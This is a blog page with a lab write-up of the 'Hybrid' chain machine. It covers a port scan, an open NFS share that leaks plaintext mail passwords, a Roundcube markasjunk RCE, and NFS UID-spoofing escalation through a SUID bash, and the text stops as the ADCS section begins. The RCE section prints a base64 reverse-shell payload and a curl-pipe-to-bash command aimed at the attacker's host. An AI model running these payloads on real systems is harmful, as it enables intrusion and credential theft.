@@ -1,0 +1,453 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Initial Reconnaissancemail01.hybrid.vl12345678910111213141516171819202122232425262728293031323334353637383940414243PORT      STATE SERVICE  REASON         VERSION22&#x2F;tcp    open  ssh      syn-ack ttl 6">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VL-Hybrid">
+<meta property="og:url" content="https://panosoikogr.github.io/2025/03/28/VL-Hybrid/index.html">
+<meta property="og:site_name" content="Panosoiko Cybersecurity Blog">
+<meta property="og:description" content="Initial Reconnaissancemail01.hybrid.vl12345678910111213141516171819202122232425262728293031323334353637383940414243PORT      STATE SERVICE  REASON         VERSION22&#x2F;tcp    open  ssh      syn-ack ttl 6">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Hybrid/mail.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Hybrid/peter_email.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Hybrid/shell.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Hybrid/priv_esc.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Hybrid/esc1.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Hybrid/gotdomain.png">
+<meta property="article:published_time" content="2025-03-28T00:14:52.000Z">
+<meta property="article:modified_time" content="2025-03-27T22:25:06.246Z">
+<meta property="article:author" content="Panosoiko">
+<meta property="article:tag" content="VL">
+<meta property="article:tag" content="Chain">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://panosoikogr.github.io/images/Hybrid/mail.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/web-app-manifest-192x192.png">
+        
+      
+    
+    <!-- title -->
+    <title>VL-Hybrid</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-73BMC8ZHB7"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-73BMC8ZHB7');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writeups</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/03/18/VL-Breach/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2025/03/28/VL-Hybrid/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2025/03/28/VL-Hybrid/&text=VL-Hybrid"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2025/03/28/VL-Hybrid/&title=VL-Hybrid"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2025/03/28/VL-Hybrid/&is_video=false&description=VL-Hybrid"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VL-Hybrid&body=Check out this article: https://panosoikogr.github.io/2025/03/28/VL-Hybrid/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2025/03/28/VL-Hybrid/&title=VL-Hybrid"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2025/03/28/VL-Hybrid/&title=VL-Hybrid"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2025/03/28/VL-Hybrid/&title=VL-Hybrid"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2025/03/28/VL-Hybrid/&title=VL-Hybrid"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2025/03/28/VL-Hybrid/&name=VL-Hybrid&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2025/03/28/VL-Hybrid/&t=VL-Hybrid"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Reconnaissance"><span class="toc-number">1.</span> <span class="toc-text">Initial Reconnaissance</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#mail01-hybrid-vl"><span class="toc-number">1.1.</span> <span class="toc-text">mail01.hybrid.vl</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SMTP-Exploration"><span class="toc-number">2.</span> <span class="toc-text">SMTP Exploration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Roundcube-Webmail-Analysis"><span class="toc-number">2.1.</span> <span class="toc-text">Roundcube Webmail Analysis</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NFS-Exploration"><span class="toc-number">3.</span> <span class="toc-text">NFS Exploration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Credential-Discovery"><span class="toc-number">3.1.</span> <span class="toc-text">Credential Discovery</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploitation-Strategy"><span class="toc-number">4.</span> <span class="toc-text">Exploitation Strategy</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">4.1.</span> <span class="toc-text">Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Advanced-NFS-User-Context-Exploitation"><span class="toc-number">4.1.1.</span> <span class="toc-text">Advanced NFS User Context Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Initial-User-Reconnaissance"><span class="toc-number">4.1.1.1.</span> <span class="toc-text">Initial User Reconnaissance</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Exploitation-Methodology"><span class="toc-number">4.1.1.2.</span> <span class="toc-text">Exploitation Methodology</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Detailed-Exploitation-Steps"><span class="toc-number">4.1.1.3.</span> <span class="toc-text">Detailed Exploitation Steps</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dc01-hybrid-vl"><span class="toc-number">4.2.</span> <span class="toc-text">dc01.hybrid.vl</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ADCS-Active-Directory-Certificate-Services-Exploitation"><span class="toc-number">5.</span> <span class="toc-text">ADCS (Active Directory Certificate Services) Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Initial-Reconnaissance-1"><span class="toc-number">5.1.</span> <span class="toc-text">Initial Reconnaissance</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Machine-Account-Exploitation"><span class="toc-number">5.2.</span> <span class="toc-text">Machine Account Exploitation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Final-Domain-Admin-Acquisition"><span class="toc-number">5.3.</span> <span class="toc-text">Final Domain Admin Acquisition</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        VL-Hybrid
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Panosoiko</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-03-28T00:14:52.000Z" class="dt-published" itemprop="datePublished">2025-03-28</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Chain/" rel="tag">Chain</a>, <a class="p-category" href="/tags/VL/" rel="tag">VL</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="Initial-Reconnaissance"><a href="#Initial-Reconnaissance" class="headerlink" title="Initial Reconnaissance"></a>Initial Reconnaissance</h2><h3 id="mail01-hybrid-vl"><a href="#mail01-hybrid-vl" class="headerlink" title="mail01.hybrid.vl"></a>mail01.hybrid.vl</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE  REASON         VERSION</span><br><span class="line">22/tcp    open  ssh      syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu)</span><br><span class="line">25/tcp    open  smtp     syn-ack ttl 63 Postfix smtpd</span><br><span class="line">|_smtp-commands: mail01.hybrid.vl, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, AUTH PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, CHUNKING</span><br><span class="line">80/tcp    open  http     syn-ack ttl 63 nginx 1.18.0 (Ubuntu)</span><br><span class="line">110/tcp   open  pop3     syn-ack ttl 63 Dovecot pop3d</span><br><span class="line">|_pop3-capabilities: UIDL CAPA PIPELINING STLS TOP RESP-CODES SASL AUTH-RESP-CODE</span><br><span class="line">111/tcp   open  rpcbind  syn-ack ttl 63 2-4 (RPC #100000)</span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp   rpcbind</span><br><span class="line">|   100000  3,4          111/tcp6  rpcbind</span><br><span class="line">|   100000  3,4          111/udp6  rpcbind</span><br><span class="line">|   100003  3,4         2049/tcp   nfs</span><br><span class="line">|   100003  3,4         2049/tcp6  nfs</span><br><span class="line">|   100005  1,2,3      34727/udp   mountd</span><br><span class="line">|   100005  1,2,3      54128/udp6  mountd</span><br><span class="line">|   100005  1,2,3      56559/tcp6  mountd</span><br><span class="line">|   100005  1,2,3      58479/tcp   mountd</span><br><span class="line">|   100021  1,3,4      39665/tcp6  nlockmgr</span><br><span class="line">|   100021  1,3,4      42639/udp6  nlockmgr</span><br><span class="line">|   100021  1,3,4      43503/tcp   nlockmgr</span><br><span class="line">|   100021  1,3,4      53303/udp   nlockmgr</span><br><span class="line">|   100024  1          37589/tcp   status</span><br><span class="line">|   100024  1          45525/tcp6  status</span><br><span class="line">|   100024  1          51675/udp   status</span><br><span class="line">|   100024  1          52103/udp6  status</span><br><span class="line">|   100227  3           2049/tcp   nfs_acl</span><br><span class="line">|_  100227  3           2049/tcp6  nfs_acl</span><br><span class="line">143/tcp   open  imap     syn-ack ttl 63 Dovecot imapd (Ubuntu)</span><br><span class="line">587/tcp   open  smtp     syn-ack ttl 63 Postfix smtpd</span><br><span class="line">|_smtp-commands: mail01.hybrid.vl, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, AUTH PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, CHUNKING</span><br><span class="line">993/tcp   open  ssl/imap syn-ack ttl 63 Dovecot imapd (Ubuntu)</span><br><span class="line">995/tcp   open  ssl/pop3 syn-ack ttl 63 Dovecot pop3d</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">|_pop3-capabilities: UIDL CAPA PIPELINING USER TOP RESP-CODES SASL(PLAIN LOGIN) </span><br><span class="line">2049/tcp  open  nfs_acl  syn-ack ttl 63 3 (RPC #100227)</span><br><span class="line">37589/tcp open  status   syn-ack ttl 63 1 (RPC #100024)</span><br><span class="line">43503/tcp open  nlockmgr syn-ack ttl 63 1-4 (RPC #100021)</span><br><span class="line">43935/tcp open  mountd   syn-ack ttl 63 1-3 (RPC #100005)</span><br><span class="line">50923/tcp open  mountd   syn-ack ttl 63 1-3 (RPC #100005)</span><br><span class="line">58479/tcp open  mountd   syn-ack ttl 63 1-3 (RPC #100005)</span><br></pre></td></tr></table></figure>
+<p>Machine: Ubuntu<br>Initial Observations:</p>
+<ol>
+<li>SMTP: Potential for username enumeration (two ports available)</li>
+<li>HTTP: Possible exploit avenue</li>
+<li>SSH: Potential credential discovery</li>
+<li>Recommendation: Perform full port scan</li>
+</ol>
+<h2 id="SMTP-Exploration"><a href="#SMTP-Exploration" class="headerlink" title="SMTP Exploration"></a>SMTP Exploration</h2><p>Initially attempted to exploit a CVE for SMTP RCE, but was unsuccessful.</p>
+<p><img src="/images/Hybrid/mail.png" alt="SMTP"></p>
+<p>After directory searching, discovered:</p>
+<ul>
+<li>Port 80 runs Roundcube Webmail Release 1.6.1</li>
+<li>No major known vulnerabilities initially apparent</li>
+</ul>
+<h3 id="Roundcube-Webmail-Analysis"><a href="#Roundcube-Webmail-Analysis" class="headerlink" title="Roundcube Webmail Analysis"></a>Roundcube Webmail Analysis</h3><p>Examined <code>composer.json</code> for version and dependency details.<br>References:</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.rapid7.com/db/vulnerabilities/debian-cve-2024-42009/">Rapid7 Vulnerability Database</a></li>
+</ul>
+<h2 id="NFS-Exploration"><a href="#NFS-Exploration" class="headerlink" title="NFS Exploration"></a>NFS Exploration</h2><p>Mount NFS Share:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mount -t nfs -o vers=3 10.10.176.38:/opt/share /mnt/tmpmnt -o nolock</span><br></pre></td></tr></table></figure>
+
+<p>Found <code>backup.tar.gz</code>, extracted contents:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -xvzf backup.tar.gz</span><br></pre></td></tr></table></figure>
+
+<p>Extracted Files:</p>
+<ul>
+<li><code>/etc/passwd</code></li>
+<li><code>/etc/sssd/sssd.conf</code></li>
+<li><code>/etc/dovecot/dovecot-users</code></li>
+<li><code>/etc/postfix/main.cf</code></li>
+<li><code>/opt/certs/hybrid.vl/fullchain.pem</code></li>
+<li><code>/opt/certs/hybrid.vl/privkey.pem</code></li>
+</ul>
+<h3 id="Credential-Discovery"><a href="#Credential-Discovery" class="headerlink" title="Credential Discovery"></a>Credential Discovery</h3><p>In <code>/mnt/etc/dovecot/dovecot-users</code>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin@hybrid.vl:&#123;plain&#125;Duckling21</span><br><span class="line">peter.turner@hybrid.vl:&#123;plain&#125;PeterIstToll!</span><br></pre></td></tr></table></figure>
+<p><img src="/images/Hybrid/peter_email.png" alt="Peter&#39;s Email"></p>
+<h2 id="Exploitation-Strategy"><a href="#Exploitation-Strategy" class="headerlink" title="Exploitation Strategy"></a>Exploitation Strategy</h2><p>Identified Vulnerability:</p>
+<ul>
+<li>Roundcube version 1.6.1 and prior (with markasjunk plugin enabled)</li>
+<li><a target="_blank" rel="noopener" href="https://ssd-disclosure.com/ssd-advisory-roundcube-markasjunk-rce/">SSD Advisory - Roundcube RCE</a></li>
+</ul>
+<p>Exploitation Techniques:</p>
+<ol>
+<li><p>Base64 Encoded Payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">L2Jpbi9zaCAtaSA+JiAvZGV2L3RjcC8xMC44LjUuMTk1LzQ0NDQgMD4mMQ==</span><br></pre></td></tr></table></figure></li>
+<li><p>Url Encode it:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">L2Jpbi9zaCAtaSA%2BJiAvZGV2L3RjcC8xMC44LjUuMTk1LzQ0NDQgMD4mMQ%3D%3D</span><br></pre></td></tr></table></figure></li>
+<li><p>Put it all together and send it threw burp:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin%26echo$&#123;IFS&#125;L2Jpbi9zaCAtaSA%2BJiAvZGV2L3RjcC8xMC44LjUuMTk1LzQ0NDQgMD4mMQ%3D%3D|base64$&#123;IFS&#125;-d|bash%26%40hybrid.vl</span><br></pre></td></tr></table></figure>
+<p><img src="/images/Hybrid/shell.png" alt="Shell Exploitation"></p>
+</li>
+<li><p>Alternate Payload Method:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">peter.turner&amp;curl$&#123;IFS&#125;10.8.5.195/shell.sh$&#123;IFS&#125;|$&#123;IFS&#125;bash&amp;@hybrid.vl</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>After creating the identity we send a email the ourselves (using the identity we created) and we click the Junk button for the payload to trigger</p>
+<h3 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h3><p>Database Credentials after running linpeas:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$config[&#x27;db_dsnw&#x27;] = &#x27;mysql://roundcube:Duckling21@localhost/roundcubemail&#x27;;</span><br></pre></td></tr></table></figure>
+<p>MySQL Access:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u roundcube -p roundcubemail</span><br></pre></td></tr></table></figure>
+<p><img src="/images/Hybrid/priv_esc.png" alt="Privilege Escalation"><br>We didnt find anything noteworthy on the database.</p>
+<h4 id="Advanced-NFS-User-Context-Exploitation"><a href="#Advanced-NFS-User-Context-Exploitation" class="headerlink" title="Advanced NFS User Context Exploitation"></a>Advanced NFS User Context Exploitation</h4><p>This exploit leverages a sophisticated technique involving User ID (UID) manipulation and NFS (Network File System) permissions. By carefully crafting a series of steps, we can potentially gain access to a user’s context without direct credential compromise.</p>
+<h5 id="Initial-User-Reconnaissance"><a href="#Initial-User-Reconnaissance" class="headerlink" title="Initial User Reconnaissance"></a>Initial User Reconnaissance</h5><p>When examining the target user’s identification details, we observe a critical piece of information:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www-data@mail01:~/roundcube$ id peter.turner@hybrid.vl</span><br><span class="line">id peter.turner@hybrid.vl</span><br><span class="line">uid=902601108(peter.turner@hybrid.vl) gid=902600513(domain users@hybrid.vl) groups=902600513(domain users@hybrid.vl),902601104(hybridusers@hybrid.vl)</span><br></pre></td></tr></table></figure>
+
+<h5 id="Exploitation-Methodology"><a href="#Exploitation-Methodology" class="headerlink" title="Exploitation Methodology"></a>Exploitation Methodology</h5><p>The core of this technique revolves around creating a local user with an identical UID and manipulating the bash executable’s permissions through an NFS-mounted share.<br>The attack involves a nuanced approach of running <code>/bin/bash</code> in a context that mimics the target user, without directly compromising their actual credentials. By creating a user with the same UID and strategically modifying the bash binary, we can effectively execute commands in the target user’s context.</p>
+<h5 id="Detailed-Exploitation-Steps"><a href="#Detailed-Exploitation-Steps" class="headerlink" title="Detailed Exploitation Steps"></a>Detailed Exploitation Steps</h5><p>Each step is carefully designed to recreate the target user’s environment and escalate privileges:</p>
+<ul>
+<li>Remote Host: <code>cp /bin/bash /opt/share/</code><ul>
+<li>Copying the <code>/bin/bash</code> executable into the NFS share.</li>
+</ul>
+</li>
+<li>Local Host: <code>sudo useradd peter.turner@hybrid.vl -u 902601108</code><ul>
+<li>Creating a user named <code>peter.turner@hybrid.vl</code> with the same UID as the remote machine.</li>
+<li>NOTE: We will need to edit <code>/etc/login.defs</code> and change <code>UID_MAX</code> to a value greater than <code>902601108</code>.</li>
+</ul>
+</li>
+<li>Local Host: <code>sudo su -l peter.turner@hybrid.vl</code><ul>
+<li>Logging into the new user we created.*</li>
+</ul>
+</li>
+<li>Local Host: <code>sudo mount -t nfs -o vers=3 10.10.231.246:/opt/share /mnt/tmpmnt -o nolock</code><ul>
+<li>Mounting the NFS share to <code>/mnt/tmpmnt</code> once more.</li>
+</ul>
+</li>
+<li>Local Host: <code>cp /mnt/tmpmnt/bash /tmp/tmpbash/</code><ul>
+<li>Copying the <code>bash</code> executable to a temporary directory just so we can reset the privileges of the binary&#x2F;</li>
+</ul>
+</li>
+<li>Remote Host: <code>rm /opt/share/bash</code><ul>
+<li>Removing the <code>bash</code> executable from the remote machine so that we can replace it with a newly configured bash executable.</li>
+</ul>
+</li>
+<li>Local Host: <code>cp /tmp/tmpbash/bash /mnt/tmpmnt/</code><ul>
+<li>Copying our executable back into the NFS share.</li>
+</ul>
+</li>
+<li>Local Host: <code>chmod +s /mnt/tmpmnt/bash</code><ul>
+<li>Configuring the sticky bit of the <code>bash</code> executable. By configuring this privilege, it is essentially saying that any user that runs this binary will run it as the context of that user.</li>
+</ul>
+</li>
+<li>Remote Host: <code>/opt/share/bash -p</code><ul>
+<li>We are running the <code>bash</code> binary with <code>-p</code>, which stands for <code>privileged mode</code>. This essentially means that it will set the effective user ID (EUID) to the real user ID. The binary will run with the permissions of the same user who invoked it based on the user ID. (In this case, <code>peter.turner@hybrid.vl</code>)<br><a target="_blank" rel="noopener" href="https://github.com/InfoSecWarrior/Offensive-Pentesting-Enumeration/blob/main/NFS/README.md#escalate-the-privileges-by-nfs">https://github.com/InfoSecWarrior/Offensive-Pentesting-Enumeration/blob/main/NFS/README.md#escalate-the-privileges-by-nfs</a></li>
+</ul>
+</li>
+</ul>
+<h3 id="dc01-hybrid-vl"><a href="#dc01-hybrid-vl" class="headerlink" title="dc01.hybrid.vl"></a>dc01.hybrid.vl</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE       REASON          VERSION</span><br><span class="line">53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus</span><br><span class="line">88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-03-22 13:05:38Z)</span><br><span class="line">135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory </span><br><span class="line">445/tcp   open  microsoft-ds? syn-ack ttl 127</span><br><span class="line">464/tcp   open  kpasswd5?     syn-ack ttl 127</span><br><span class="line">593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory </span><br><span class="line">3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory </span><br><span class="line">3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services</span><br><span class="line">| rdp-ntlm-info: </span><br><span class="line">|   Target_Name: HYBRID</span><br><span class="line">|   NetBIOS_Domain_Name: HYBRID</span><br><span class="line">|   NetBIOS_Computer_Name: DC01</span><br><span class="line">|   DNS_Domain_Name: hybrid.vl</span><br><span class="line">|   DNS_Computer_Name: dc01.hybrid.vl</span><br><span class="line">|   Product_Version: 10.0.20348</span><br><span class="line">9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing</span><br><span class="line">49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">50182/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">53771/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">53784/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">53791/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">53807/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">55984/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br></pre></td></tr></table></figure>
+
+<h2 id="ADCS-Active-Directory-Certificate-Services-Exploitation"><a href="#ADCS-Active-Directory-Certificate-Services-Exploitation" class="headerlink" title="ADCS (Active Directory Certificate Services) Exploitation"></a>ADCS (Active Directory Certificate Services) Exploitation</h2><h3 id="Initial-Reconnaissance-1"><a href="#Initial-Reconnaissance-1" class="headerlink" title="Initial Reconnaissance"></a>Initial Reconnaissance</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy find -u &#x27;peter.turner&#x27;@hybrid.vl -p &#x27;b0cwR+G4Dzl_rw&#x27; -dc-ip 10.10.210.149</span><br></pre></td></tr></table></figure>
